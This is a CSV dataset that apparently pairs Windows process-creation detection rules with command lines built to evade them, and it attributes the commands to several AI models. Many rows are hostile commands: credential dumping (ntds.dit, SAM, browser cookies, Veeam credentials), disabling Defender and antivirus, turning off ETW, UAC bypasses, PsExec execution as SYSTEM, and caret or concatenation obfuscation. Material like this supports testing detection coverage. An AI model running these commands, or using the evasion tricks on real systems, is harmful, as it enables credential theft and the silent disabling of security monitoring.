rule_name,commandline_evasion,row_count,sources
proc_creation_win_sc_service_tamper_for_persistence,"reg.exe add ""HKLM\SYSTEM\CurrentControlSet\Services\ExampleService"" /v ImagePath /t REG_EXPAND_SZ /d ""C:\Windows\Temp\backdoor"" /f",2,gemini:2
proc_creation_win_schtasks_delete_all,"schtasks.exe /delete /tn ""*"" /f",1,qwen14b
proc_creation_win_schtasks_delete_all,schtasks.exe /delete /tn '*' /f,1,qwen32b
proc_creation_win_schtasks_delete_all,schtasks.exe /delete /tn * -f,1,qwen32b
proc_creation_win_schtasks_delete_all,"schtasks.exe /f /delete /tn ""*""",2,qwen14b; qwen32b
proc_creation_win_schtasks_env_folder,"schtasks.exe -create /tn ""TestTask1"" /tr ""C:\Perflogs\test.txt"" /sc daily",1,gemini
proc_creation_win_secedit_execution,secedit.exe -export /areas SECURITYPOLICY -cfg output_mysecpol.txt,11,gemini:10; qwen32b
proc_creation_win_sqlcmd_veeam_db_recon,"copy ""C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe"" C:\Temp\dbquery.exe && C:\Temp\dbquery.exe -S localhost -d VeeamBackup -Q ""SELECT * FROM Credentials""",2,gemini; qwen32b
proc_creation_win_sqlcmd_veeam_dump,"copy ""C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\sqlcmd.exe"" C:\Temp\custom_cmd.exe && C:\Temp\custom_cmd.exe -E -S localhost -Q ""SELECT TOP 10 * FROM [VeeamBackup].[dbo].[Credentials]""",1,gemini
proc_creation_win_sqlite_chromium_profile_data,"C:\AtomicRedTeam\atomics\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe ""C:/Users/thaim/AppData/Local/Google/Chrome/User Data/Default/Network/Cookies""",2,gemini:2
proc_creation_win_sqlite_chromium_profile_data,"C:\ExternalPayloads\sqlite3.exe ""C:\Users\thaim\AppData\Local\Google\Chrome\User Data/Default/Network/Cookies""",2,gemini:2
proc_creation_win_sqlite_chromium_profile_data,"C:\ExternalPayloads\sqlite3.exe ""C:\Users\thaim\AppData\Local\Google\Chrome\User Data\Default\Network\Cook""""ies""",2,gemini:2
proc_creation_win_sqlite_chromium_profile_data,"cmd.exe /c C:\ExternalPayloads\sqlite3.exe ""C:\Users\thaim\AppData\Local\Google\Chrome\User Data\Default\Network\Cook^ies""",2,gemini:2
proc_creation_win_ssh_rdp_tunneling,"ssh.exe -L 1234:127.0.0.1:""3389"" user@remote-host",2,gemini; qwen32b
proc_creation_win_ssh_rdp_tunneling,ssh.exe -L 1234:127.0.0.1:03389 user@remote-host,1,gemini
proc_creation_win_ssh_rdp_tunneling,"ssh.exe -o ""LocalForward 1234 127.0.0.1 3389"" user@remote-host",2,gemini; qwen32b
proc_creation_win_susp_alternate_data_streams,"reg.exe export HKCU\Software\Test ""C:\Temp\backup.log:hidden""",1,gemini
proc_creation_win_susp_alternate_data_streams,type C:\Temp\test.txt>C:\Temp\host.txt:stream.txt,1,gemini
proc_creation_win_susp_copy_browser_data,"powershell.exe -Command ""cp '$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data' 'C:\AtomicRedTeam\atomics\..\ExternalPayloads'""",1,qwen32b
proc_creation_win_susp_data_exfiltration_via_cli,curl.exe --url http://127.0.0.1 --data-binary @C:\Windows\System32\notepad.exe,1,qwen32b
proc_creation_win_susp_disable_raccine,reg delete HKCU\Software\Raccine\Tray /f,1,qwen32b
proc_creation_win_susp_disable_raccine,reg.exe delete HKCU\Software\Raccine\Tray /f,1,qwen32b
proc_creation_win_susp_disable_raccine,"taskkill /f /im ""RaccineSettings"".exe",1,gemini
proc_creation_win_susp_embed_exe_lnk,"C:\Windows\System32\cmd.exe -""c"" pwsh.exe -nop -c ""Write-Host 'Bypass'"" -f payload.lnk",1,gemini
proc_creation_win_susp_embed_exe_lnk,"C:\Windows\System32\cmd.exe /""c"" pwsh.exe -nOp -""c"" ""Write-Host 'Bypass'"" -f payload.lnk",1,gemini
proc_creation_win_susp_embed_exe_lnk,"C:\Windows\System32\cmd.exe /""c"" pwsh.exe -nOp -c ""Write-Host 'Bypass'"" -""f"" payload.lnk",1,gemini
proc_creation_win_susp_embed_exe_lnk,"cmd /c powershell.exe -Command ""Invoke-Item 'C:\\Test\\example.lnk'""",1,qwen32b
proc_creation_win_susp_embed_exe_lnk,"cmd.exe /c powershell -Command ""& { Start-Process 'C:\\Test\\example.lnk' }""",1,qwen32b
proc_creation_win_susp_embed_exe_lnk,"cmd.exe /c powershell.exe -Command ""Start-Process 'C:\Windows\System32\notepad.exe' -ArgumentList 'C:\\Test\\example.lnk'""",1,qwen32b
proc_creation_win_susp_etw_modification_cmdline,"cmd.exe /c ""set COMPlus^;_ETWEnabled=0 && C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe""",1,gemini
proc_creation_win_susp_etw_modification_cmdline,"powershell.exe -Command ""$env:DOTNET_ETWEnabled=0; Start-Process C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe""",1,gemini
proc_creation_win_susp_etw_trace_evasion,"wevtutil.exe ""set-log"" TEST-HOST /e:""false""",1,gemini
proc_creation_win_susp_ms_appinstaller_download,"cmd.exe /c ""start ms-appinstaller://?""source""=http://example.com/package.appinstaller""",2,gemini:2
proc_creation_win_susp_non_priv_reg_or_ps,"powershell.exe -Command ""Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Servi*' -Name ('Image' + 'Path') -Value 'C:\Temp\test.txt'""",2,gemini; qwen32b
proc_creation_win_susp_non_priv_reg_or_ps,"reg.exe   add  ""HKLM\System\CurrentControlSet\Services\TEST-HOST""   /v ImagePath  /t REG_EXPAND_SZ  /d ""C:\Temp\test.txt""  /f",1,qwen32b
proc_creation_win_susp_non_priv_reg_or_ps,"reg.exe add ""HKLM\System\CurrentControlSet\Services\TEST-HOST"" /v ImagePath /t REG_EXPAND_SZ /d ""C:\Lab\input\sample.txt"" /f",3,qwen14b:2; qwen32b
proc_creation_win_susp_non_priv_reg_or_ps,"reg.exe add ""HKLM\System\CurrentControlSet\Services\TEST-HOST"" /v ImagePath /t REG_EXPAND_SZ /d ""C:\Temp\test.txt"" /f",1,qwen32b
proc_creation_win_susp_non_priv_reg_or_ps,reg.exe add HKLM\System\CurrentControlSet\Services\TEST-HOST /v ImagePath /t REG_EXPAND_SZ /d C:\Temp\test.txt /f,1,qwen32b
proc_creation_win_susp_ntds,"cmd.exe -""c"" ntdsutil ""a^c i ntds"" ifm ""cre^ate full C:\exfil"" q q",1,gemini
proc_creation_win_susp_ntds,"powershell.exe -""Command"" ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'""",1,gemini
proc_creation_win_susp_ntds,"powershell.exe -COMMAnD ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'""",1,gemini
proc_creation_win_susp_ntds,"powershell.exe -COmMAnd ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'""",1,gemini
proc_creation_win_susp_ntds,"powershell.exe -Command ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'""",1,gemini
proc_creation_win_susp_ntds,"powershell.exe -c ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'""",1,gemini
proc_creation_win_susp_ntds,"powershell.exe -coMMAND ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'""",1,gemini
proc_creation_win_susp_ntds,"powershell.exe -commaNd ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'""",1,gemini
proc_creation_win_susp_ntds,"powershell.exe /""Command"" ""Copy-Item ('C:\Windows\NTDS\nt' + 'ds.dit') -Destination 'C:\exfil\data.bin'""",1,gemini
proc_creation_win_susp_nteventlogfile_usage,wmic /namespace:\root\cimv2 path Win32_NTEventlogFile get /value,1,qwen14b
proc_creation_win_susp_nteventlogfile_usage,"wmic /namespace:\root\cimv2 path Win32_NTEventlogFile get Name,Description",1,qwen14b
proc_creation_win_susp_nteventlogfile_usage,wmic /namespace:\root\cimv2 path Win32_NTEventlogFile where Name='Application' get /value,1,qwen14b
proc_creation_win_susp_obfuscated_ip_via_cli,ping.exe 012.010.010.010,1,qwen32b
proc_creation_win_susp_obfuscated_ip_via_cli,ping.exe 020.020.020.020,1,qwen32b
proc_creation_win_susp_right_to_left_override,"cmd.exe /v:on /c ""set ""R=â€®"" && powershell.exe -Command ""Write-Output 'TEST-HOST !R!'""""",1,gemini
proc_creation_win_susp_right_to_left_override,"powershell.exe -Command ""Write-Output 'TEST-HOST â€®'""",1,qwen32b
proc_creation_win_susp_right_to_left_override,"powershell.exe -Command ""Write-Output 'TEST-HOSTâ€®'""",2,qwen32b:2
proc_creation_win_susp_right_to_left_override,"powershell.exe -c ""Write-Output 'TEST-HOST â€®'""",1,qwen32b
proc_creation_win_susp_service_tamper,"powershell.exe -Command ""Get-Service -Name '*BITS*' | Set-Service -Status Stopped""",3,gemini:2; qwen32b
proc_creation_win_susp_service_tamper,"powershell.exe -Command ""Get-Service -Name 'WinDefend' | Stop-Service""",2,qwen32b:2
proc_creation_win_susp_service_tamper,"powershell.exe -Command ""Get-WmiObject -Class Win32_Service -Filter 'Name='TestService'' | % { $_.StopService() }""",3,qwen14b:2; qwen32b
proc_creation_win_susp_service_tamper,"sc \""delete\"" \""MSSQL$SQLEXPRESS\""",2,qwen32b:2
proc_creation_win_susp_service_tamper,sc config 'WinDefend' start= disabled,2,qwen32b:2
proc_creation_win_susp_service_tamper,"sc.exe \""delete\"" \""avast! Antivirus\""",2,qwen32b:2
proc_creation_win_susp_service_tamper,"sc.exe config ""BITS"" start= disabled",3,gemini:2; qwen32b
proc_creation_win_susp_sysvol_access,"powershell.exe -Command ""Get-ChildItem -Path 'C:\\Windows\\SYSVOL\\sysvol\\example.com\\policies'""",1,qwen32b
proc_creation_win_susp_sysvol_access,powershell.exe -c Get-ChildItem -Path C:\\Windows\\SYSVOL\\sysvol\\example.com\\policies,1,qwen32b
proc_creation_win_susp_task_folder_evasion,cmd.exe /c e^cho. > C:\Windows\System32\Tasks\test.txt,3,gemini:3
proc_creation_win_susp_velociraptor_child_process,"powershell.exe -Command ""$iwr_alias = 'I' + 'WR'; Invoke-Expression ""$iwr_alias -Uri http://example.com/test.txt -OutFile C:\Temp\test.txt""""",2,gemini:2
proc_creation_win_sysinternals_eula_accepted,"""C:\Users\Public\Temp\PsExec.exe"" ""-accepteula"" -i -s cmd",2,gemini; qwen32b
proc_creation_win_sysinternals_eula_accepted,"""C:\Users\Public\Temp\PsExec.exe"" /accepteula -i -s cmd",2,gemini; qwen32b
proc_creation_win_sysinternals_eula_accepted,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\PsExec.exe"" \\localhost --accepteula -c C:\Windows\System32\cmd.exe",1,qwen32b
proc_creation_win_sysinternals_eula_accepted,"""cmd.exe"" /c ""C:\AtomicRedTeam\atomics\..\ExternalPayloads\T1003.004\bin\PsExec.exe"" --accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y",1,qwen32b
proc_creation_win_sysinternals_eula_accepted,"cmd.exe /c ""C:\Users\Public\Temp\PsExec.exe"" -accept^eula -i -s cmd",1,gemini
proc_creation_win_sysinternals_susp_psexec_paexec_flags,"C:\Tools\RemoteExecHelper.exe -s ""cmd /c whoami""",1,qwen32b
proc_creation_win_systemsettingsadminflows_turn_on_dev_features,C:\Windows\System32\SystemSettingsAdminFlows.exe -ArgumentList 'DeveloperUnlock' -NoDeveloperMode,1,qwen14b
proc_creation_win_taskkill_sep,taskkill /F /IM $env:CCSVCHST,1,qwen32b
proc_creation_win_taskkill_sep,taskkill /F /IM ccSvcHst,1,gemini
proc_creation_win_taskkill_sep,taskkill /IM ccSvcHst.exe /F,2,qwen14b; qwen32b
proc_creation_win_teams_suspicious_command_line_cred_access,"cmd /c move ""/Microsoft/Teams/Local Storage/leveldb"" "".""",1,qwen32b
proc_creation_win_teams_suspicious_command_line_cred_access,"powershell.exe -Command ""Copy-Item -Path '$env:LOCALAPPDATA\\Microsoft\\Teams\\Cookies' -Destination '.'""",1,qwen32b
proc_creation_win_uac_bypass_cleanmgr,C:\Windows\system32\cleanmgr.exe /autoclean /d C:,2,gemini:2
proc_creation_win_uac_bypass_cleanmgr,C:\Windows\system32\cleanmgr.exe /autoclean /d C:\,3,gemini:2; qwen32b
proc_creation_win_uac_bypass_cleanmgr,C:\Windows\system32\cleanmgr.exe /autoclean /d C:\Lab\input\sample.log,3,qwen14b:2; qwen32b
proc_creation_win_uac_bypass_cleanmgr,C:\Windows\system32\cleanmgr.exe /autoclean /d C:\Lab\input\sample.txt,3,qwen14b:2; qwen32b
proc_creation_win_uac_bypass_cleanmgr,C:\Windows\system32\cleanmgr.exe /autoclean /d D:,3,qwen14b:2; qwen32b
proc_creation_win_uac_bypass_cleanmgr,C:\Windows\system32\cleanmgr.exe /autoclean /d c:,3,gemini:2; qwen32b
proc_creation_win_uac_bypass_cleanmgr,cleanmgr.exe /autoclean /d C:,4,qwen32b:4
proc_creation_win_uac_bypass_cleanmgr,cleanmgr.exe /autoclean /d C:\,2,qwen32b:2
proc_creation_win_uac_bypass_eventvwr_recentviews,eventvwr.exe,2,qwen32b:2
proc_creation_win_uac_bypass_msconfig_gui,C:\Windows\system32\msconfig.exe -5,3,gemini:2; qwen32b
proc_creation_win_uac_bypass_msconfig_gui,C:\\Windows\system32\msconfig.exe -5,2,qwen32b:2
proc_creation_win_uac_bypass_msconfig_gui,"cmd.exe /c ""C:\Windows\system32\msconfig.exe"" -5",3,qwen14b:2; qwen32b
proc_creation_win_uac_bypass_msconfig_gui,msconfig.exe -5,2,qwen32b:2
proc_creation_win_uac_bypass_msconfig_gui,"powershell.exe -Command ""Start-Process 'C:\Windows\system32\msconfig.exe' -ArgumentList '-5'""",2,qwen14b:2
proc_creation_win_uac_bypass_ntfs_reparse_point,C:\Windows\System32\wusa.exe /quiet C:\Users\Public\..\AppData\Local\Temp\update.msu,2,gemini:2
proc_creation_win_vaultcmd_list_creds,"cmd.exe /c """"C:\WINDOWS\system32\VaultCmd.exe"" /lis^tcreds:""Web Credentials"" /all""",1,gemini
proc_creation_win_vaultcmd_list_creds,"vaultcmd.exe -listcreds:""Windows Credentials""",1,gemini
proc_creation_win_vscode_child_processes_anomalies,"cmd.exe /c r^undll32.exe C:\ProgramData\payload.dll,DllMain",4,gemini:4
proc_creation_win_vscode_tunnel_execution,code --accept-server-license-terms tunnel --port 8080,1,qwen14b
proc_creation_win_vslsagent_agentextensionpath_load,copy vsls-agent.exe renamed-agent.exe && renamed-agent.exe --agentExtensionPath C:\evil.dll,1,gemini
proc_creation_win_wbadmin_dump_sensitive_files,"cmd.exe /""c"" wbadmin start backup -backupTarget:e: -""include:C:\Windows\System32\conf^ig\SAM""",1,gemini
proc_creation_win_wbadmin_dump_sensitive_files,"cmd.exe /C wbadmin start backup -""backupTarget:e:"" /""include:C:\Windows\System32\conf^ig\SAM""",1,gemini
proc_creation_win_webdav_lnk_execution,cmd.exe /c start \\192.168.1.50@80\share\payload.lnk,3,gemini:2; qwen32b
proc_creation_win_webdav_lnk_execution,"explorer.exe /e,\server\webdav\path_x000c_ile.lnk",1,qwen32b
proc_creation_win_webdav_lnk_execution,powershell.exe -Command Start-Process -FilePath \\server\webdav\path\file.lnk,1,qwen32b
proc_creation_win_werfaultsecure_process_freeze,"C:\Windows\System32\WerFaultSecure.exe ""/h"" ""/pid"" 1234 ""/tid"" 5678 ""/encfile"" C:\path\to\file ""/cancel"" ""/type"" 268310",1,gemini
proc_creation_win_werfaultsecure_process_freeze,C:\Windows\System32\WerFaultSecure.exe -h -pid 1234 -tid 5678 -encfile C:\path\to\file -cancel -type 268310,2,gemini; qwen32b
proc_creation_win_werfaultsecure_process_freeze,C:\Windows\System32\WerFaultSecure.exe /type 268310 /cancel /encfile C:\path\to\file /tid 5678 /pid 1234 /h,1,gemini
proc_creation_win_whoami_groups_discovery,"cmd.exe -""c"" whoami -""g^roups""",2,gemini; qwen32b
proc_creation_win_whoami_groups_discovery,"cmd.exe -""c"" whoami /G^ROups",1,gemini
proc_creation_win_winget_add_custom_source,"winget ""source"" ""add"" -""n"" CustomRepo -""a"" https://example.com",3,gemini:2; qwen32b
proc_creation_win_winget_add_custom_source,"winget ""source"" ""add"" -""n"" CustomRepo --accept-source-arms https://example.com",3,gemini:2; qwen32b
proc_creation_win_winget_add_custom_source,"winget ""source"" ""add"" -""n"" CustomRepo -a https://example.com",3,gemini:2; qwen32b
proc_creation_win_winget_add_custom_source,"winget ""source"" ""add"" -""n"" CustomRepo /""a"" https://example.com",3,gemini:2; qwen32b
proc_creation_win_winget_add_custom_source,"winget ""source"" ""add"" --no-deps CustomRepo --accept-source-arms https://example.com",3,gemini:2; qwen32b
proc_creation_win_winget_add_custom_source,"winget ""source"" ""add"" --no-deps CustomRepo -A https://example.com",3,gemini:2; qwen32b
proc_creation_win_winget_add_custom_source,"winget ""source"" ""add"" --no-deps CustomRepo -a https://example.com",2,gemini:2
proc_creation_win_winget_add_custom_source,"winget ""source"" ""add"" -N CustomRepo /""a"" https://example.com",2,gemini:2
proc_creation_win_winget_add_custom_source,"winget ""source"" ""add"" -n CustomRepo -a https://example.com",3,gemini:2; qwen32b
proc_creation_win_winget_local_install_via_manifest,"winget install -m""C:\Temp\test.yaml""",3,gemini:2; qwen32b
proc_creation_win_winrm_awl_bypass,"copy cscript.exe moved_cscript.exe && moved_cscript.exe //nologo winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:""pretty""",2,gemini; qwen32b
proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs,cscript.exe winrm invoke  Create wmicimv2/Win32_Process -r:[http://192.0.2.10](http://192.0.2.10),2,gemini; qwen32b
proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs,"cscript.exe winrm invoke Create ""wmicimv2/Win32_Process"" -r:[http://192.0.2.10](http://192.0.2.10)",2,gemini; qwen32b
proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs,cscript.exe winrm invoke Create wmicimv2/Win32_Process /r:[http://192.0.2.10](http://192.0.2.10),2,gemini; qwen32b
proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs,cscript.exe winrm invoke Create wmicimv2/Win32_ScheduledJob -r:[http://192.0.2.10](http://192.0.2.10),2,gemini; qwen32b
proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs,cscript.exe winrm.vbs invoke Create wmicimv2/Win32_Process -r:[http://192.0.2.10](http://192.0.2.10),2,gemini; qwen32b
proc_creation_win_wmic_eventconsumer_creation,"wmic /namespace:\\root\subscription path __EventConsumer create name=""TestConsumer"" /nogc",3,qwen14b:2; qwen32b
proc_creation_win_wmic_eventconsumer_creation,wmic /namespace:\\root\subscription path __EventConsumer where name='TestConsumer' create /nogc,1,qwen14b
proc_creation_win_wmic_recon_computersystem,"powershell.exe -NOPRoFILE -winDoWSTyLE Hidden -c ""Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Domain, Username, Model""",3,gemini:2; qwen32b
proc_creation_win_wmic_recon_computersystem,"powershell.exe -NoProfile -WindowStyle Hidden -Command ""Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Domain, Username, Model""",3,gemini:2; qwen32b
proc_creation_win_wmic_recon_computersystem,"powershell.exe -noPRoFIlE -WIndoWstyLe Hidden -c ""Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object Domain, Username, Model""",3,gemini:2; qwen32b
proc_creation_win_wmic_recon_csproduct,"powershell -""NoProfile"" -COmMaND ""(Get-CimInstance Win32_ComputerSystem).Model""",1,gemini
proc_creation_win_wmic_recon_csproduct,"powershell -""NoProfile"" /""Command"" ""(Get-CimInstance Win32_ComputerSystem).Model""",2,gemini; qwen32b
proc_creation_win_wmic_recon_csproduct,"powershell -NoProFIle -COmmaND ""(Get-CimInstance Win32_ComputerSystem).Model""",1,gemini
proc_creation_win_wmic_recon_csproduct,"powershell -NoProfile -Command ""(Get-CimInstance Win32_ComputerSystem).Model""",1,gemini
proc_creation_win_wmic_recon_csproduct,"powershell -nop -""Command"" ""(Get-CimInstance Win32_ComputerSystem).Model""",2,gemini; qwen32b
proc_creation_win_wmic_recon_csproduct,"powershell -nop -CoMMand ""(Get-CimInstance Win32_ComputerSystem).Model""",2,gemini; qwen32b
proc_creation_win_wmic_recon_csproduct,"powershell -nop -c ""(Get-CimInstance Win32_ComputerSystem).Model""",1,gemini
proc_creation_win_wmic_recon_csproduct,"powershell -nopRoFIle -COMmaNd ""(Get-CimInstance Win32_ComputerSystem).Model""",2,gemini; qwen32b
proc_creation_win_wmic_recon_csproduct,"powershell /""NoProfile"" -coMmAnd ""(Get-CimInstance Win32_ComputerSystem).Model""",2,gemini; qwen32b
proc_creation_win_wmic_recon_csproduct,"powershell /""NoProfile"" /""Command"" ""(Get-CimInstance Win32_ComputerSystem).Model""",1,gemini
proc_creation_win_wmic_recon_csproduct,set CMD=csproduct& wmic.exe %CMD% get name,1,qwen32b
proc_creation_win_wmic_recon_product_class,wmic.exe /Namespace:\\root\SecurityCenter2 Path Software Get Name /Format:List,2,qwen14b:2
proc_creation_win_wmic_recon_product_class,wmic.exe /Namespace:\\root\SecurityCenter2 Path Software Get Name /Format:List /Output:C:\Lab\out\software_list.txt,2,qwen14b:2
